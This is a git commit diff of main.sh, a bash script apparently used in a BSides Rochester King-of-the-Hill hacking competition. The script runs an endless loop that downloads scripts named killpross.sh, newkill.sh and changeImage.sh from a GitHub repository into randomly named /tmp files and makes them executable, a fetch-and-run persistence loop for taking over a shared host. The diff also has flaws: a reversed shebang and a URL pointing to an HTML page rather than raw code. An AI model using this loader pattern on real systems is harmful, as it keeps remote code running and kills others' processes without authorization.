55d10820de2007cb8b2ad611aac116faace13cad
baa7968 <baa7968@rit.edu>
2018-04-14 16:06:13 -0400

    update

--- main.sh
+++ main.sh
@@ -1,8 +1,8 @@
 !#/bin/bash
 while :
 do
-	wget -O /tmp/aldskf.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
-	wget -O /tmp/djflw.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
+	wget -O /tmp/aldskf.sh https://github.com/bd3r/BsidesRochesterKOTH/blob/master/changeImage.sh
+	wget -O /tmp/djflw.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/newkill.sh
 
 	sleep 1
 	chmod +x /tmp/aldskf.sh & chmod +x /tmp/djflw.sh
